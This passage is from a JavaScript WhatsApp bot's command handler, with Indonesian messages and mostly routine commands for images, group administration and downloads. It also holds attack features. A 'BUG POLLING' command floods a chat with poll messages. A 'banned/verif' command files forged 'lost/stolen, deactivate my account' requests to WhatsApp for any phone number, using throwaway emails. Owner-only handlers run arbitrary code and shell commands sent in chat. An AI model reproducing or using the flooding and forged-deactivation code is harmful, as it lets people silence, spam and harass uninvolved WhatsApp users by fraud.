            );
          } else if (!room) {
            let buty = [
              {
                buttonId: "dm",
                buttonText: { displayText: "Delete Menfess" },
                type: 1,
              },
            ];
            await SatganzDevs.sendButtonText(
              m.chat,
              buty,
              `\`\`\`Masih Ada Sesi Menfess Sebelumnya, Tekan Tombol Di Bawah Untuk Menghentikan Sesi Menfess Sebelumnya\`\`\``,
              botname,
              m
            );
          }
        }
        break;
      case "waifu":
        {
          tesk = `*${ucapanWaktu} Kak ${pushname}*\n*Silahkan Pilih Dibawah Ini*\n\n_Dosa Tanggung Sendiri :v_`;
          let buttons = [
            {
              buttonId: `menu`,
              buttonText: { displayText: "📚MENU" },
              type: 1,
            },
            { buttonId: `sfw`, buttonText: { displayText: "✅SFW" }, type: 1 },
          ];
          await SatganzDevs.sendButtonText(m.chat, buttons, tesk, botname, m, {
            quoted: m,
          });
        }
        break;
      case "sfw":
        {
          proses(from);
          anu = await fetchJson(`https://waifu.pics/api/sfw/waifu`);
          buffer = await getBuffer(anu.url);
          SatganzDevs.sendMessage(
            m.chat,
            { image: buffer, caption: `Random Waifu`, footer: botname },
            { quoted: m }
          );
        }
        break;
      case "couple":
        {
          proses(from);
          let anu = await fetchJson(
            "https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json"
          );
          let random = anu[Math.floor(Math.random() * anu.length)];
          SatganzDevs.sendMessage(
            m.chat,
            { image: { url: random.male }, caption: `Couple Male` },
            { quoted: m }
          );
          SatganzDevs.sendMessage(
            m.chat,
            { image: { url: random.female }, caption: `Couple Female` },
            { quoted: m }
          );
        }
        break;
      case "coffe":
      case "kopi":
        {
          proses(from);
          let buttons = [
            {
              buttonId: `coffe`,
              buttonText: { displayText: "Next Image" },
              type: 1,
            },
          ];
          let buttonMessage = {
            image: { url: "https://coffee.alexflipnote.dev/random" },
            fileLength: 99999999,
            caption: `☕ Random Coffe`,
            footer: botname,
            buttons: buttons,
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      // OWNER COMMAND
      case "react":
        {
          if (!isCreator) throw mess.owner;
          reactionMessage = {
            react: {
              text: args[0],
              key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
            },
          };
          SatganzDevs.sendMessage(m.chat, reactionMessage);
        }
        break;
      case "join":
        {
          if (!isCreator) throw mess.owner;
          if (!text) throw "Masukkan Link Group!";
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            throw "Link Invalid!";
          reply(mess.wait);
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          await SatganzDevs.groupAcceptInvite(result)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "leave":
        {
          if (!isCreator) throw mess.owner;
          await SatganzDevs.groupLeave(m.chat)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "setexif":
        {
          if (!isCreator) throw mess.owner;
          if (!text) throw `Example : ${prefix + command} packname|author`;
          global.packname = text.split("|")[0];
          global.author = text.split("|")[1];
          reply(
            `Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`
          );
        }
        break;
      case "kick":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await SatganzDevs.groupParticipantsUpdate(m.chat, [users], "remove")
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "add":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let users = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await SatganzDevs.groupParticipantsUpdate(m.chat, [users], "add")
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "promote":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await SatganzDevs.groupParticipantsUpdate(m.chat, [users], "promote")
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "demote":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await SatganzDevs.groupParticipantsUpdate(m.chat, [users], "demote")
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "block":
        {
          if (!isCreator) throw mess.owner;
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await SatganzDevs.updateBlockStatus(users, "block")
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "unblock":
        {
          if (!isCreator) throw mess.owner;
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await SatganzDevs.updateBlockStatus(users, "unblock")
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "setname":
      case "setsubject":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (!text) throw "Text ?";
          await SatganzDevs.groupUpdateSubject(m.chat, text)
            .then((res) => reply(mess.success))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          if (!text) throw "Text ?";
          await SatganzDevs.groupUpdateDescription(m.chat, text)
            .then((res) => reply(mess.success))
            .catch((err) => reply(jsonformat(err)));
        }
        break;
      case "setppbot":
        {
          if (!isCreator) throw mess.owner;
          if (!quoted)
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          if (!/image/.test(mime))
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          if (/webp/.test(mime))
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted);
          let { img, preview } = await generateProfilePicture(media);
          await SatganzDevs.query({
            tag: "iq",
            attrs: {
              to: botNumber,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          }).catch((err) => fs.unlinkSync(media));
          reply(mess.success);
        }
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        {
          if (!m.isGroup) throw mess.group;
          if (!isAdmins) throw mess.admin;
          if (!quoted)
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          if (!/image/.test(mime))
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          if (/webp/.test(mime))
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted);
          await SatganzDevs.updateProfilePicture(m.chat, { url: media }).catch(
            (err) => fs.unlinkSync(media)
          );
          reply(mess.success);
        }
        break;
      case "tagall":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : "kosong"}*\n\n`;
          for (let mem of participants) {
            teks += `• @${mem.id.split("@")[0]}\n`;
          }
          SatganzDevs.sendMessage(
            m.chat,
            { text: teks, mentions: participants.map((a) => a.id) },
            { quoted: m }
          );
        }
        break;
      case "hidetag":
        {
          if (!m.isGroup) throw mess.group;
          if (!isBotAdmins) throw mess.botAdmin;
          if (!isAdmins) throw mess.admin;
          SatganzDevs.sendMessage(
            m.chat,
            { text: q ? q : "", mentions: participants.map((a) => a.id) },
            { quoted: m }
          );
        }
        break;
      case "wallpaper":
        {
          if (!text) throw "Masukkan Query Title";
          proses(from);
          let { wallpaper } = require("./lib/scraper");
          anu = await wallpaper(text);
          result = anu[Math.floor(Math.random() * anu.length)];
          let buttons = [
            {
              buttonId: `wallpaper ${text}`,
              buttonText: { displayText: "Next Image" },
              type: 1,
            },
          ];
          let buttonMessage = {
            image: { url: result.image[0] },
            caption: `⭔ Title : ${result.title}\n⭔ Category : ${
              result.type
            }\n⭔ Detail : ${result.source}\n⭔ Media Url : ${
              result.image[2] || result.image[1] || result.image[0]
            }`,
            footer: botname,
            buttons: buttons,
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "gcsearch":
        {
          try {
            if (!text)
              return m.replay(`Example :\n${prefix}searchgc Classy Editor`);
            proses(from);
            nae = args.join(" ");
            hx.linkwa(nae).then((res) => {
              teks = "```「 Search Group 」```";
              for (let i of res) {
                teks += `\n\n│⭔> Group Whatsapp :\n`;
                teks += `${i.link}\n`;
                teks += `*${i.nama}`;
              }
              SatganzDevs.sendMessage(
                m.chat,
                {
                  image: {
                    url: "https://telegra.ph/file/6cbed9af4ca002de3a801.jpg",
                  },
                  caption: teks,
                  footer: botname,
                },
                { quoted: m }
              );
            });
          } catch (e) {
            reply(mess.errmor);
          }
        }
        break;
      case "wikimedia":
        {
          if (!text) throw "Masukkan Query Title";
          proses(from);
          let { wikimedia } = require("./lib/scraper");
          anu = await wikimedia(text);
          result = anu[Math.floor(Math.random() * anu.length)];
          let buttons = [
            {
              buttonId: `wikimedia ${text}`,
              buttonText: { displayText: "Next Image" },
              type: 1,
            },
          ];
          let buttonMessage = {
            image: { url: result.image },
            caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
            footer: botname,
            buttons: buttons,
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "fbdl":
      case "facebook":
        {
          if (!text) return reply(`Example : ${prefix + command} link`);
          if (!q.includes("facebook.com")) return reply(`Link Invalid!!`);
          proses(from);
          const { fbdl } = require("./lib/facebook");
          fbdl(q).then((data) => {
            if (data.length == 0)
              return reply(`Maaf terjadi kesalahan, ganti link yang lain!`);
            SatganzDevs.sendMessage(
              m.chat,
              { video: { url: data[data.length - 1] }, caption: data.title },
              { quoted: m }
            );
          });
        }
        break;
      case "img":
      case "pinterest":
      case "image":
        {
          if (!text) throw "Masukkan Query Link!";
          proses(from);
          let { pinterest } = require("./lib/scraper");
          anu = await pinterest(text);
          result = anu[Math.floor(Math.random() * anu.length)];
          SatganzDevs.sendMessage(
            m.chat,
            {
              image: { url: result },
              fileLength: 999999999999999,
              caption: `Media Url :\n` + result,
            },
            { quoted: m }
          );
        }
        break;
      case "git":
      case "gitclone":
        if (!args[0])
          return reply(
            `Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`
          );
        if (!isUrl(args[0]) && !args[0].includes("github.com"))
          return reply(`Link invalid!!`);
        proses(from);
        let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
        let [, user, repo] = args[0].match(regex1) || [];
        repo = repo.replace(/.git$/, "");
        let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
        let filename = (await fetch(url, { method: "HEAD" })).headers
          .get("content-disposition")
          .match(/attachment; filename=(.*)/)[1];
        SatganzDevs.sendMessage(
          m.chat,
          {
            document: { url: url },
            fileName: filename + ".zip",
            mimetype: "application/zip",
          },
          { quoted: m }
        ).catch((err) => reply(mess.error));
        break;
      case "listpc":
        {
          if (!isCreator) throw mess.owner;
          let anu = await store.chats
            .all()
            .filter((v) => v.id.endsWith(".net"))
            .map((v) => v.id);
          let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`;
          for (let i of anu) {
            let nama = store.messages[i].array[0].pushName;
            teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${
              i.split("@")[0]
            }\n\n───────────────\n\n`;
            let buttons = [
              {
                buttonId: "donasi",
                buttonText: { displayText: "👑 SEWA" },
                type: 1,
              },
              {
                buttonId: "rules",
                buttonText: { displayText: "❗Rules" },
                type: 1,
              },
            ];
            await SatganzDevs.sendButtonText(
              m.chat,
              buttons,
              teks,
              nyoutube,
              m,
              { mentions: [i], quoted: fkontak }
            );
          }
        }
        break;
      case "listgc":
        {
          if (!isCreator) throw mess.owner;
          let anu = await store.chats
            .all()
            .filter((v) => v.id.endsWith("@g.us"))
            .map((v) => v.id);
          let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`;
          for (let i of anu) {
            let metadata = await SatganzDevs.groupMetadata(i);
            teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${
              metadata.owner !== undefined
                ? "@" + metadata.owner.split`@`[0]
                : "Tidak diketahui"
            }\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(
              metadata.creation * 1000
            )
              .tz("Asia/Jakarta")
              .format("DD/MM/YYYY HH:mm:ss")}\n⬡ *Member :* ${
              metadata.participants.length
            }\n\n─────────────────\n\n`;
            let buttons = [
              {
                buttonId: "donasi",
                buttonText: { displayText: "👑 SEWA" },
                type: 1,
              },
              {
                buttonId: "rules",
                buttonText: { displayText: "❗Rules" },
                type: 1,
              },
            ];
            await SatganzDevs.sendButtonText(
              m.chat,
              buttons,
              teks,
              botname,
              m,
              { mentions: [metadata.owner], quoted: fkontak }
            );
          }
        }
        break;
      case "listonline":
      case "liston":
        {
          let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
          let online = [...Object.keys(store.presences[id]), botNumber];
          SatganzDevs.sendText(
            m.chat,
            "List Online:\n\n" +
              online.map((v) => "⭔ @" + v.replace(/@.+/, "")).join`\n`,
            m,
            { mentions: online }
          );
        }
        break;
      // BUG POLLING
      case "poll":
        {
          const doc = {
            key: {
              fromMe: false,
              participant: `0@s.whatsapp.net`,
              ...(from ? { remoteJid: "" } : {}),
            },
            message: {
              stickerMessage: {
                url: "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
                fileSha256: "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
                fileEncSha256: "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
                mediaKey: "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
                mimetype: "image/webp",
                directPath:
                  "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
                fileLength: "14240",
                mediaKeyTimestamp: "1664991742",
                isAnimated: false,
              },
            },
          };
          if (args.length == 0)
            return m.reply(
              `Penggunaan ${prefix + command} jumlah\nContoh ${
                prefix + command
              } 5`
            );
          jumlah = q;
          ydd = `Hi Iam SatganzDevs`;
          for (let i = 0; i < jumlah; i++) {
            var pollCreation = generateWAMessageFromContent(
              m.chat,
              proto.Message.fromObject({
                pollCreationMessage: {
                  name: "Hi iam SatganzDevs",
                  options: [
                    {
                      optionName: "KATANYA WA KEBAL",
                    },
                    {
                      optionName: "BERANI VOTE GA",
                    },
                    {
                      optionName: "VOTE LAH SEMUA",
                    },
                    {
                      optionName: "KATANYA KEBAL",
                    },
                    {
                      optionName: "SALAM BROTHER BY DANIMAKER",
                    },
                  ],
                  selectableOptionsCount: 3,
                },
              }),
              { userJid: m.chat, quoted: doc }
            );
            SatganzDevs.relayMessage(m.chat, pollCreation.message, {
              messageId: pollCreation.key.id,
            });
          }
          reply("sukses");
        }
        break;
      // BUG VERIF //
      case "verif":
      case "banned":
        {
          var axioss = require("axios");
          let ntah = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10"
          );
          let cookie = ntah.headers["set-cookie"].join("; ");
          let $ = cheerio.load(ntah.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "ID");
          form.append("phone_number", q);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append("your_message", "Perdido/roubado: desative minha conta");
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))));
        }
        break;
        case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                SatganzDevs.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
case 'upsw':
let sw = {
          text: "TEST",
          textArgb: 4294967295,
          backgroundArgb: 4286484643,
          font: "SANS_SERIF",
          previewType: "NONE",
          inviteLinkGroupTypeV2: "DEFAULT"
      }
    SatganzDevs.sendMessage("status@broadcast", sw)
    reply('suksess')
    break
      default:
        if (isCmd) {
          let list = [
            { id: "listgc" },
            { id: "banned" },
            { id: "sad" },
            { id: "motivasi" },
            { id: "quotesanime" },
            { id: "listonline" },
            { id: "listpc" },
            { id: "tiktokaudio" },
            { id: "tiktokaudio" },
            { id: "menu" },
            { id: "tiktokmp3" },
            { id: "tiktolaudio" },
            { id: "toqr" },
            { id: "toimg" },
            { id: "toaudio" },
            { id: "togif" },
            { id: "tovideo" },
            { id: "tovn" },
            { id: "tourl" },
            { id: "sticker" },
            { id: "owner" },
            { id: "gitclone" },
            { id: "wikimedia" },
            { id: "wallpaper" },
            { id: "pinterest" },
            { id: "play" },
            { id: "ytmp3" },
            { id: "ytmp4" },
            { id: "menfess" },
            { id: "attp" },
            { id: "tts" },
            { id: "smeme" },
            { id: "stickerwm" },
            { id: "simi" },
            { id: "autoai" },
            { id: "public" },
            { id: "self" },
            { id: "antilink" },
          ];
          let key = "id";
          const didYouMean = require("didyoumean");
          var result = await didYouMean(budy, list, key);
          console.log();
          let buttons = [
            { buttonId: result, buttonText: { displayText: result }, type: 1 },
          ];
          await SatganzDevs.sendButtonText(
            m.chat,
            buttons,
            `Mungkin Yang Anda Maksud Adalah *${result}*\nAbaikan Jikah Salah`,
            botname,
            m
          );
        }

        if (budy.startsWith("=>")) {
          if (!isCreator) return reply(mess.owner);
          function Return(sul) {
            sat = JSON.stringify(sul, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(sul);
            }
            return reply(bang);
          }
          try {
            reply(
              util.format(eval(`(async () => { return ${budy.slice(3)} })()`))
            );
          } catch (e) {
            reply(String(e));
          }
        }

        if (budy.startsWith(">")) {
          if (!isCreator) return reply(mess.owner);
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await reply(evaled);
          } catch (err) {
            await reply(String(err));
          }
        }

        if (budy.startsWith("$")) {
          if (!isCreator) return reply(mess.owner);
          exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(err);
            if (stdout) return reply(stdout);
          });
        }

        if (m.chat.endsWith("@s.whatsapp.net") && isCmd) {
          this.anonymous = this.anonymous ? this.anonymous : {};
          let room = Object.values(this.anonymous).find(
            (room) =>
              [room.a, room.b].includes(m.sender) && room.state === "CHATTING"
          );
          if (room) {
            if (/^.*(next|leave|start)/.test(m.text)) return;
            if (
              [
                ".next",
                ".leave",
                ".stop",
                ".start",
                "Cari Partner",
                "Keluar",
                "Lanjut",
                "Stop",
              ].includes(m.text)
            )
              return;
            let other = [room.a, room.b].find((user) => user !== m.sender);
            m.copyNForward(
              other,
              true,
              m.quoted && m.quoted.fromMe
                ? {
                    contextInfo: {
                      ...m.msg.contextInfo,
                      forwardingScore: 0,
                      isForwarded: true,
                      participant: other,
                    },
                  }
                : {}
            );
          }
          this.menfess = this.menfess ? this.menfess : {};
          let mroom = Object.values(this.menfess).find(
            (room) =>
              [room.a, room.b].includes(m.sender) && room.state === "CHATTING"
          );
          if (mroom) {
            if (/^.*(next|leave|start)/.test(m.text)) return;
            if (
              [
                ".next",
                ".leave",
                ".stop",
                ".start",
                "Cari Partner",
                "Keluar",
                "Lanjut",
                "Stop",
              ].includes(m.text)
            )
              return;
            let other = [mroom.a, mroom.b].find((user) => user !== m.sender);
            m.copyNForward(
              other,
              true,
              m.quoted && m.quoted.fromMe
                ? {
                    contextInfo: {
                      ...m.msg.contextInfo,
                      forwardingScore: 0,
                      isForwarded: true,
                      participant: other,
                    },
                  }
                : {}
            );
          }
        }
    }
  } catch (err) {
    m.reply(
      "Maaf kak, Ada Yang Error, mohon lapor owner ya untuk supaya bug ini bisa di benerin ><"
    );
    SatganzDevs.sendMessage("6281316701742@s.whatsapp.net", {
      text: util.format(err),
    });
  }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});
